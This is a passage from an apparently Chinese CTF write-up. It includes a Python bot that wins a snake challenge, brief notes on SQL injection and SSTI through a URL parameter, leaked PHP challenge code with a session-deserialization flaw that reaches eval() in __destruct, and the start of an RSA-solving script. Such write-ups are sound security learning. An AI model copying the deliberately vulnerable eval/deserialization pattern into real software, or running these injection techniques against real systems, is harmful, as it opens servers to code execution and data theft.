class=\"line\">    <span class=\"keyword\">if</span> response.status_code != <span class=\"number\">200</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> Exception(<span class=\"string\">f&quot;Failed to send direction: <span class=\"subst\">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Response:&quot;</span>, response.json())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response.json()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算曼哈顿距离</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">heuristic</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">abs</span>(a[<span class=\"number\">0</span>] - b[<span class=\"number\">0</span>]) + <span class=\"built_in\">abs</span>(a[<span class=\"number\">1</span>] - b[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># A* 寻路算法</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">a_star_search</span>(<span class=\"params\">start, goal, snake</span>):</span><br><span class=\"line\">    open_set = []</span><br><span class=\"line\">    heapq.heappush(open_set, (<span class=\"number\">0</span>, start))</span><br><span class=\"line\">    came_from = &#123;&#125;</span><br><span class=\"line\">    g_score = &#123;<span class=\"built_in\">tuple</span>(start): <span class=\"number\">0</span>&#125;</span><br><span class=\"line\">    f_score = &#123;<span class=\"built_in\">tuple</span>(start): heuristic(start, goal)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> open_set:</span><br><span class=\"line\">        _, current = heapq.heappop(open_set)</span><br><span class=\"line\">        current = <span class=\"built_in\">tuple</span>(current)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> current == <span class=\"built_in\">tuple</span>(goal):</span><br><span class=\"line\">            path = []</span><br><span class=\"line\">            <span class=\"keyword\">while</span> current <span class=\"keyword\">in</span> came_from:</span><br><span class=\"line\">                path.append(current)</span><br><span class=\"line\">                current = came_from[current]</span><br><span class=\"line\">            path.reverse()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> path</span><br><span class=\"line\"></span><br><span class=\"line\">        neighbors = [</span><br><span class=\"line\">            (current[<span class=\"number\">0</span>] + <span class=\"number\">1</span>, current[<span class=\"number\">1</span>]),  <span class=\"comment\"># RIGHT</span></span><br><span class=\"line\">            (current[<span class=\"number\">0</span>] - <span class=\"number\">1</span>, current[<span class=\"number\">1</span>]),  <span class=\"comment\"># LEFT</span></span><br><span class=\"line\">            (current[<span class=\"number\">0</span>], current[<span class=\"number\">1</span>] + <span class=\"number\">1</span>),  <span class=\"comment\"># DOWN</span></span><br><span class=\"line\">            (current[<span class=\"number\">0</span>], current[<span class=\"number\">1</span>] - <span class=\"number\">1</span>)   <span class=\"comment\"># UP</span></span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> neighbor <span class=\"keyword\">in</span> neighbors:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= neighbor[<span class=\"number\">0</span>] &lt; <span class=\"number\">20</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> &lt;= neighbor[<span class=\"number\">1</span>] &lt; <span class=\"number\">20</span> <span class=\"keyword\">and</span> <span class=\"built_in\">list</span>(neighbor) <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> snake:</span><br><span class=\"line\">                tentative_g_score = g_score[<span class=\"built_in\">tuple</span>(current)] + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">tuple</span>(neighbor) <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> g_score <span class=\"keyword\">or</span> tentative_g_score &lt; g_score[<span class=\"built_in\">tuple</span>(neighbor)]:</span><br><span class=\"line\">                    came_from[<span class=\"built_in\">tuple</span>(neighbor)] = current</span><br><span class=\"line\">                    g_score[<span class=\"built_in\">tuple</span>(neighbor)] = tentative_g_score</span><br><span class=\"line\">                    f_score[<span class=\"built_in\">tuple</span>(neighbor)] = tentative_g_score + heuristic(neighbor, goal)</span><br><span class=\"line\">                    heapq.heappush(open_set, (f_score[<span class=\"built_in\">tuple</span>(neighbor)], neighbor))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算下一步的方向</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calculate_next_direction</span>(<span class=\"params\">snake, food, current_direction</span>):</span><br><span class=\"line\">    head = snake[<span class=\"number\">0</span>]</span><br><span class=\"line\">    path = a_star_search(head, food, snake)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> path:</span><br><span class=\"line\">        next_head = path[<span class=\"number\">0</span>]</span><br><span class=\"line\">        x_diff = next_head[<span class=\"number\">0</span>] - head[<span class=\"number\">0</span>]</span><br><span class=\"line\">        y_diff = next_head[<span class=\"number\">1</span>] - head[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> x_diff == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;RIGHT&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> x_diff == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;LEFT&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> y_diff == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;DOWN&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> y_diff == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;UP&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 如果找不到路径，随机选择一个安全的方向</span></span><br><span class=\"line\">    possible_directions = [<span class=\"string\">&#x27;UP&#x27;</span>, <span class=\"string\">&#x27;DOWN&#x27;</span>, <span class=\"string\">&#x27;LEFT&#x27;</span>, <span class=\"string\">&#x27;RIGHT&#x27;</span>]</span><br><span class=\"line\">    opposite_directions = &#123;<span class=\"string\">&#x27;UP&#x27;</span>: <span class=\"string\">&#x27;DOWN&#x27;</span>, <span class=\"string\">&#x27;DOWN&#x27;</span>: <span class=\"string\">&#x27;UP&#x27;</span>, <span class=\"string\">&#x27;LEFT&#x27;</span>: <span class=\"string\">&#x27;RIGHT&#x27;</span>, <span class=\"string\">&#x27;RIGHT&#x27;</span>: <span class=\"string\">&#x27;LEFT&#x27;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> direction <span class=\"keyword\">in</span> possible_directions:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> direction == opposite_directions[current_direction]:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>  <span class=\"comment\"># 不选择相反方向</span></span><br><span class=\"line\"></span><br><span class=\"line\">        next_head = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;UP&#x27;</span>: [head[<span class=\"number\">0</span>], head[<span class=\"number\">1</span>] - <span class=\"number\">1</span>],</span><br><span class=\"line\">            <span class=\"string\">&#x27;DOWN&#x27;</span>: [head[<span class=\"number\">0</span>], head[<span class=\"number\">1</span>] + <span class=\"number\">1</span>],</span><br><span class=\"line\">            <span class=\"string\">&#x27;LEFT&#x27;</span>: [head[<span class=\"number\">0</span>] - <span class=\"number\">1</span>, head[<span class=\"number\">1</span>]],</span><br><span class=\"line\">            <span class=\"string\">&#x27;RIGHT&#x27;</span>: [head[<span class=\"number\">0</span>] + <span class=\"number\">1</span>, head[<span class=\"number\">1</span>]]</span><br><span class=\"line\">        &#125;[direction]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= next_head[<span class=\"number\">0</span>] &lt; <span class=\"number\">20</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> &lt;= next_head[<span class=\"number\">1</span>] &lt; <span class=\"number\">20</span> <span class=\"keyword\">and</span> next_head <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> snake:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> direction</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 如果所有方向都会导致碰撞，返回当前方向</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> current_direction</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 主循环</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main_loop</span>():</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 初始化游戏状态</span></span><br><span class=\"line\">        game_state = send_direction_and_get_state(<span class=\"string\">&#x27;RIGHT&#x27;</span>)</span><br><span class=\"line\">        snake = game_state[<span class=\"string\">&#x27;snake&#x27;</span>]</span><br><span class=\"line\">        food = game_state[<span class=\"string\">&#x27;food&#x27;</span>]</span><br><span class=\"line\">        score = game_state[<span class=\"string\">&#x27;score&#x27;</span>]</span><br><span class=\"line\">        current_direction = <span class=\"string\">&#x27;RIGHT&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 计算下一步的方向</span></span><br><span class=\"line\">            next_direction = calculate_next_direction(snake, food, current_direction)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 发送方向请求并获取新的游戏状态</span></span><br><span class=\"line\">            game_state = send_direction_and_get_state(next_direction)</span><br><span class=\"line\">            snake = game_state[<span class=\"string\">&#x27;snake&#x27;</span>]</span><br><span class=\"line\">            food = game_state[<span class=\"string\">&#x27;food&#x27;</span>]</span><br><span class=\"line\">            new_score = game_state[<span class=\"string\">&#x27;score&#x27;</span>]</span><br><span class=\"line\">            status = game_state[<span class=\"string\">&#x27;status&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 更新方向</span></span><br><span class=\"line\">            current_direction = next_direction</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 打印当前状态</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Current direction: <span class=\"subst\">&#123;next_direction&#125;</span>, Snake: <span class=\"subst\">&#123;snake&#125;</span>, Food: <span class=\"subst\">&#123;food&#125;</span>, Score: <span class=\"subst\">&#123;new_score&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> status != <span class=\"string\">&#x27;ok&#x27;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Game over with status: <span class=\"subst\">&#123;status&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span> KeyboardInterrupt:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;程序已退出&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main_loop()</span><br></pre></td></tr></table></figure>\n<p>​\t\t最后得到了这个：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Response<span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span>&#x27;status&#x27;<span class=\"punctuation\">:</span> &#x27;win&#x27;<span class=\"punctuation\">,</span> &#x27;url&#x27;<span class=\"punctuation\">:</span> &#x27;/snake_win?username=g01den&#x27;<span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后访问这个路由，感觉怪怪的，没有 flag，发现 username 的参数直接被打印了，测一测 ssti，失败了，完蛋。或者说，试试看 sql 注入，能成功，最后找到了列数：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/5084599173804427bdc3b1a2353bcb7a.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t能出，不过，我不理解为啥这里也能出 ssti？请看 VCR：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/32ea45b9656242ed8fde7ea072d05877.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t这个源码层面咋实现的？有点刁钻了，算了，直接嗦（这里被当作 html 执行了，所以看不到）：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/6f915faccad24280a7fc245b46464a92.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/80af9bc9b43b4694941b70507ec7d561.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t得到 flag。</p>\n<h2 id=\"platform复现\"><a class=\"markdownIt-Anchor\" href=\"#platform复现\">#</a> platform（复现）：</h2>\n<p>​\t\twww.zip 泄露，index：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&#x27;user.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&#x27;class.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sessionManager</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SessionManager</span>();</span><br><span class=\"line\"><span class=\"variable\">$SessionRandom</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SessionRandom</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REQUEST_METHOD&#x27;</span>] === <span class=\"string\">&#x27;POST&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;user&#x27;</span>] = <span class=\"variable\">$username</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;session_key&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;session_key&#x27;</span>] =<span class=\"variable\">$SessionRandom</span> -&gt; <span class=\"title function_ invoke__\">generateRandomString</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;password&#x27;</span>] = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"variable\">$sessionManager</span>-&gt;<span class=\"title function_ invoke__\">filterSensitiveFunctions</span>();</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">require</span> <span class=\"string\">&#x27;login.php&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t存在 <code>session_start();</code> ，估摸着有 session 反序列化，先记录下。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SessionRandom</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">generateRandomString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$length</span> = <span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">1</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$characters</span> = <span class=\"string\">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$charactersLength</span> = <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$characters</span>);</span><br><span class=\"line\">    <span class=\"variable\">$randomString</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"variable\">$length</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$randomString</span> .= <span class=\"variable\">$characters</span>[<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">0</span>, <span class=\"variable\">$charactersLength</span> - <span class=\"number\">1</span>)];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$randomString</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t <code>['session_key']</code>  长度是 1 到 50 随机的。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filterSensitiveFunctions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sessionFile</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getSessionFilePath</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(<span class=\"variable\">$sessionFile</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$sessionData</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$sessionFile</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"variable language_\">$this</span>-&gt;sensitiveFunctions <span class=\"keyword\">as</span> <span class=\"variable\">$function</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$sessionData</span>, <span class=\"variable\">$function</span>) !== <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">                    <span class=\"variable\">$sessionData</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"variable\">$function</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$sessionData</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$sessionFile</span>, <span class=\"variable\">$sessionData</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Session file not found.&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里也有点儿重要，有读取 -&gt; 替换 -&gt; 写入，并且是操作 session 的文件，感觉是字符逃逸，变少的那种。</p>\n<p>​\t\t这里存在 eval 函数，需要直接对其进行反序列化，然后触发 <code>__destruct</code> .</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">notouchitsclass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$data</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$data</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;data = <span class=\"variable\">$data</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span>-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t现在就是看看触发反序列化的方法。大佬们说，可以通过追加写入，大佬用的是 password 数组去逃逸的，这里具体原理不是很懂，反正有附件，先记录下，之后捣鼓:</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/ae98b430553b49d78d78b3f4e9681058.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/7899de5fe03643afbcc30815a260aeaf.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto：</h1>\n<h2 id=\"eazyrsa\"><a class=\"markdownIt-Anchor\" href=\"#eazyrsa\">#</a> eazyrsa：</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># encoding:utf-8</span><br><span class=\"line\">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class=\"line\">from gmpy2 import mpz, iroot, powmod, invert, is_prime</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import multiprocessing as mp</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义常量</span><br><span class=\"line\">N = mpz(</span><br><span class=\"line\">    &#x27;67962725468240199924103144864951334845750492508509360358636648068909779932072313362607631417524914992411826230276465100489023746209605790020210412575433464887238013738989770872867041592441153421617243161413094177629581581728221687772551567927241071007480087793370382177952900925657974338348428988433092737432689512506966089398873760401212521089061934975582692308605433023613521500237258699626587149952370997420510392932840377408736864097301789914658244266522930092113493152991783027162871212338968297436073316959569822974289536559300512091342692975133379473145882007983357289924135373382264527866381118893476257705939&#x27;)</span><br><span class=\"line\"># g是一个500位数，且g整除p-1和q-1</span><br><span class=\"line\">g = mpz(</span><br><span class=\"line\">    &#x27;3235645591686044532495326878291617484542045511433360748778013933565021819649890342389737893735574764418484922895778834144345295691799766302763199373647&#x27;)</span><br><span class=\"line\">e = 65537</span><br><span class=\"line\">C = mpz(</span><br><span class=\"line\">    &#x27;7918937034819399210460701361082120267249016865135589044938397478179178418982216265766430882604707450651405790878761026681351233717846491757101684210544361607883043938000941498442897699091016071609425252346011280078699567193949155766516051130050592046343488075564740812480634431357869210712013396437065989799117830247228129120071415956115563715118301273810713118159274551107354918579047901176471910532333125717712607469726900731370186233984133546278420585661042017307325998441634272568791745798269084955686428143476025911093137683806174746625559312685862694783475952178855060639359433340135424849663386199035593137765&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 计算辅助变量，使用整数除法 //</span><br><span class=\"line\">h = (N - 1) // g</span><br><span 